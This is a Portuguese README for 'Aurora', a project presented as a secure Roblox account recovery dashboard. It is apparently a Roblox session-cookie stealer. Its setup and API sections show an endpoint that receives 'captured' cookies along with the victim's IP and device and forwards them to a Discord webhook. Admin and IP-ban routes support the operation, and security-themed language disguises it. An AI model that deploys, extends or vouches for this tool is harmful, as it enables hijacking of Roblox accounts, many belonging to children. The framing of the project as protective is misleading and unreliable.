# Aurora - Sistema Seguro de Recuperação de Contas

Um dashboard moderno e seguro para recuperação de contas Roblox com design responsivo e proteção avançada.

## 🚀 Características

- ✅ **Interface Moderna**: Design glassmorphism com animações suaves
- 🔒 **Segurança em Primeiro Lugar**: Validação rigorosa e proteção contra XSS
- 📱 **Responsivo**: Funciona perfeitamente em desktop, tablet e mobile
- ⚡ **Rápido**: Otimizado para performance
- 🛡️ **Proteção de Dados**: Cookies processados de forma segura
- 🔐 **Autenticação**: Sistema de tokens para APIs administrativas
- 🚫 **Rate Limiting**: Cooldown de 19 dias entre submissões
- 🌙 **Dark Mode**: Interface escura e agradável aos olhos

## 📋 Requisitos

- Node.js 16+ (para desenvolvimento local)
- Vercel CLI (para deploy)
- Conta Discord (para webhooks)

## 🔧 Configuração

### 1. Clonar o Repositório

```bash
git clone <seu-repositorio>
cd aurora-main
```

### 2. Configurar Variáveis de Ambiente

```bash
# Copiar arquivo de exemplo
cp .env.example .env

# Editar .env com seus valores
nano .env
```

**Variáveis Obrigatórias:**

| Variável | Descrição | Exemplo |
|----------|-----------|---------|
| `DISCORD_WEBHOOK_URL` | URL do webhook Discord | `https://discord.com/api/webhooks/...` |
| `ADMIN_TOKEN` | Token de autenticação admin | `seu_token_super_secreto` |
| `ALLOWED_ORIGINS` | URLs permitidas para CORS | `https://aurora.example.com` |

### 3. Gerar Token de Admin Seguro

```bash
# Linux/Mac
openssl rand -base64 32

# Windows (PowerShell)
[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((New-Guid).ToString())) | Select-Object -First 32
```

### 4. Criar Webhook Discord

1. Abra seu servidor Discord
2. Vá para **Configurações do Servidor** → **Webhooks**
3. Clique em **Novo Webhook**
4. Escolha o canal e copie a URL
5. Cole em `DISCORD_WEBHOOK_URL` no arquivo `.env`

## 🚀 Deploy

### Vercel (Recomendado)

```bash
# Instalar Vercel CLI
npm install -g vercel

# Deploy
vercel

# Deploy para produção
vercel --prod
```

### Configuração de Produção

1. Acesse [https://vercel.com/dashboard](https://vercel.com/dashboard)
2. Selecione seu projeto
3. Vá para **Settings** → **Environment Variables**
4. Adicione as variáveis do `.env`

## 🔐 Segurança

### Boas Práticas Implementadas

- ✅ **Validação de Input**: Todos os dados são validados antes do processamento
- ✅ **Sanitização XSS**: Proteção contra injeção de scripts
- ✅ **CORS Restritivo**: Apenas origens autorizadas podem acessar
- ✅ **Sem Credenciais no Código**: Webhooks e tokens em variáveis de ambiente
- ✅ **Headers de Segurança**: X-Frame-Options, X-Content-Type-Options
- ✅ **Rate Limiting**: Cooldown de 19 dias entre submissões
- ✅ **Autenticação de API**: Token Bearer para endpoints administrativos

### ⚠️ IMPORTANTE: Nunca Faça Isso

```javascript
// ❌ ERRADO - Webhook exposto no código
const WEBHOOK_URL = "https://discord.com/api/webhooks/...";

// ❌ ERRADO - Token hardcoded
const ADMIN_TOKEN = "pornhub";

// ✅ CORRETO - Usar variáveis de ambiente
const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
```

## 📁 Estrutura do Projeto

```
aurora-main/
├── index.html              # Página principal
├── style.css               # Estilos (CSS moderno)
├── script.js               # Lógica do frontend
├── package.json            # Dependências
├── vercel.json             # Configuração Vercel
├── .env.example            # Exemplo de variáveis
├── .env                    # Variáveis de ambiente (NÃO COMMITAR)
├── banned-ips.json         # Lista de IPs banidos
├── api/
│   ├── webhook.js          # Recebe dados de cookies
│   ├── ban.js              # Gerencia bans de IP
│   ├── verificar-ban.js    # Verifica se IP está banido
│   └── migrar-bans.js      # Migração de dados
└── README.md               # Este arquivo
```

## 🔌 API Endpoints

### POST /api/webhook

Recebe dados de cookie capturado.

**Request:**
```json
{
  "cookie": "_|WARNING:...",
  "ip": "192.168.1.1",
  "device": "💻 Desktop/PC",
  "userAgent": "Mozilla/5.0..."
}
```

**Response:**
```json
{
  "success": true,
  "message": "Dados processados com sucesso",
  "sessionId": "abc123def456"
}
```

### GET /api/verificar-ban?ip=192.168.1.1

Verifica se um IP está banido.

**Response:**
```json
{
  "ip": "192.168.1.1",
  "banned": false,
  "message": "IP liberado"
}
```

### GET /api/ban

Lista todos os IPs banidos (requer autenticação).

**Headers:**
```
Authorization: Bearer seu_admin_token
```

### POST /api/ban

Bane um IP (requer autenticação).

**Headers:**
```
Authorization: Bearer seu_admin_token
Content-Type: application/json
```

**Request:**
```json
{
  "ip": "192.168.1.1",
  "motivo": "Spam detectado"
}
```

### DELETE /api/ban

Desbanir um IP (requer autenticação).

**Headers:**
```
Authorization: Bearer seu_admin_token
Content-Type: application/json
```

**Request:**
```json
{
  "ip": "192.168.1.1"
}
```

## 🐛 Troubleshooting

### Erro: "DISCORD_WEBHOOK_URL não configurada"

- Verifique se o arquivo `.env` existe
- Confirme se a variável `DISCORD_WEBHOOK_URL` está preenchida
- Reinicie o servidor

### Erro: "Não autorizado" ao usar API de ban

- Verifique se o token está correto
- Confirme se está usando o formato correto: `Bearer seu_token`
- Verifique se a variável `ADMIN_TOKEN` está configurada

### Webhook não recebe mensagens

- Verifique se a URL do webhook é válida
- Confirme se o bot tem permissão para postar no canal
- Teste o webhook manualmente com curl:

```bash
curl -X POST https://discord.com/api/webhooks/ID/TOKEN \
  -H "Content-Type: application/json" \
  -d '{"content":"Teste"}'
```

## 📝 Licença

Este projeto é fornecido como está. Use por sua conta e risco.

## 🤝 Suporte

Para problemas ou dúvidas, abra uma issue no repositório.

---

**Última atualização:** 22 de Maio de 2026

**Versão:** 2.0.0 (Segura)
